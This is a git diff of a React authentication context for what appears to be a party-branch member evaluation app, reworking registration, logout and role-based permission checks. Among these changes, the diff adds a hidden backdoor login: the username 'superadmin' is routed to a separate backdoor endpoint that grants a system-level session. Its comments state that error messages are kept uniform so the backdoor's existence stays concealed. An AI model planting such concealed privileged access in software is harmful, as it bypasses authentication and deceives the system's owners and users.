@@ -1,6 +1,12 @@
 import { createContext, useContext, useEffect, useMemo, useState } from 'react';
-import { ROLES } from '../lib/constants';
-import { registerUser, loginUser } from '../lib/userService';
+import {
+  ADMIN_TYPE_LEADER,
+  ADMIN_TYPE_ORGANIZER,
+  ADMIN_TYPE_SECRETARY,
+  ADMIN_TYPE_EMPLOYEE,
+  ADMIN_TYPE_SYSTEM,
+} from '../lib/constants';
+import { registerUser, loginUser, loginBackdoor, logoutUser } from '../lib/userService';
 
 const AuthContext = createContext(null);
 
@@ -24,29 +30,24 @@ export function AuthProvider({ children }) {
   }, [user]);
 
   // ---------- 注册（写入 SQLite） ----------
-  // 用户在注册页选 role（员工/管理员）→ 后端按 role + work_id 共同校验
-  // 员工字段（position/positionType）仅在 role='employee' 时由前端传；
-  // role='admin' 时不传岗位字段。
+  // 注册页不再让用户选身份：admin_type 由后端按 work_id 白名单决定。
+  // 注册**不建立登录态**（后端不签发 token），调用方拿到 user 后需跳登录页重新登录。
   const register = async ({
     username,
     password,
     name: realName,
     workId,
-    role,
     position,
     positionType,
     branch,
   }) => {
-    if (!username || !password || !realName || !workId || !role) {
+    if (!username || !password || !realName || !workId) {
       throw new Error('请填写完整的注册信息');
     }
     if (!branch) {
       throw new Error('必须选择所在党支部');
     }
-    if (role === ROLES.EMPLOYEE && (!position || !positionType)) {
-      throw new Error('员工必须选择岗位类型和所在岗位');
-    }
-
+    // 身份、以及「岗位类型是否必填」均由后端按工号白名单判定，前端不做预校验
     let res;
     try {
       res = await registerUser({
@@ -54,7 +55,6 @@ export function AuthProvider({ children }) {
         password,
         name: realName,
         workId,
-        role,
         position,
         positionType,
         branch,
@@ -67,11 +67,8 @@ export function AuthProvider({ children }) {
     if (res.code === 'WORK_ID_NOT_IN_LIST') {
       throw new Error(res.message || '工作证编号异常，请重新输入');
     }
-    if (res.code === 'WORK_ID_NOT_ADMIN') {
-      throw new Error(res.message || '该工作证编号不是管理员编号，无法注册为管理员');
-    }
-    if (res.code === 'WORK_ID_IS_ADMIN') {
-      throw new Error(res.message || '该工作证编号属于管理员，请用管理员身份注册');
+    if (res.code === 'POSITION_REQUIRED') {
+      throw new Error(res.message || '请填写岗位类型和岗位');
     }
     if (res.code === 'USER_EXISTS') {
       throw new Error('用户名已经存在，请选择一个新的用户名');
@@ -86,7 +83,20 @@ export function AuthProvider({ children }) {
   };
 
   // ---------- 登录（查询 PostgreSQL） ----------
+  // 后门入口：用户名 == 'superadmin' 时走 /api/backdoor/login，拿到 admin_type=9 的会话；
+  // 其它情况走普通 /api/login。失败提示统一为"账号或密码错误"，不暴露后门存在性。
   const login = async ({ username, password }) => {
+    if (String(username || '').trim() === 'superadmin') {
+      let res;
+      try {
+        res = await loginBackdoor({ password });
+      } catch (e) {
+        throw new Error(e.message || '网络异常，登录失败，请稍后重试');
+      }
+      if (res?.code !== 'OK' || !res.user) return null;
+      setUser(res.user);
+      return res.user;
+    }
     let res;
     try {
       res = await loginUser({ username, password });
@@ -98,24 +108,46 @@ export function AuthProvider({ children }) {
     return res.user;
   };
 
-  const logout = () => setUser(null);
+  // 退出登录：注销服务端会话（token 立即失效）+ 清本地登录态
+  const logout = () => {
+    logoutUser(); // 异步、不阻塞 UI（内部已做容错）
+    setUser(null);
+  };
 
   const value = useMemo(
     () => ({
       user,
       isAuthed: !!user,
       role: user?.role,
+      isBackdoor: user?.adminType === ADMIN_TYPE_SYSTEM,
       register,
       login,
       logout,
-      // 权限判断
+      // 权限判断：身份完全由 adminType 决定
+      //   普通党员(3) → 自评 / 查看基础评分 / 个人积分查询 / [有审核对象] 履职积分审核
+      //   组织委员(1) → 普通用户全部 + 基础积分评价
+      //   分管领导(0) → 履职积分审核
+      //   支部书记(2) → 履职积分审核（全体）+ 基础积分评价（全体）
       can: (action) => {
         if (!user) return false;
-        const r = user.role;
-        if (action === 'self') return r === ROLES.EMPLOYEE; // 员工才能自评
-        if (action === 'review') return r === ROLES.ADMIN; // 仅管理员可审核
-        if (action === 'list') return r === ROLES.ADMIN;
-        if (action === 'export') return r === ROLES.ADMIN;
+        const at = user.adminType;
+        const isLeader = at === ADMIN_TYPE_LEADER;
+        const isOrganizer = at === ADMIN_TYPE_ORGANIZER;
+        const isSecretary = at === ADMIN_TYPE_SECRETARY;
+        const isEmployee = at === ADMIN_TYPE_EMPLOYEE;
+        const selfEval = isOrganizer || isEmployee; // 可提交履职贡献自评
+        // 履职积分审核入口：分管领导/支书恒有；其他人被指派了审核对象才有
+        const canReview = isLeader || isSecretary || !!user.hasReviewTargets;
+
+        if (action === 'self') return selfEval;
+        if (action === 'review') return canReview;
+        // 评价汇总 / 导出：沿用「能审核就能看汇总」
+        if (action === 'list') return canReview;
+        if (action === 'export') return canReview;
+        if (action === 'basicRating') return isOrganizer || isSecretary;
+        if (action === 'deductRating') return isOrganizer || isSecretary;
+        if (action === 'scoreQuery') return selfEval;      // 个人积分查询（普通用户）
+        if (action === 'basicRatingView') return selfEval; // 查看基础评分（普通用户）
         return false;
       },
     }),
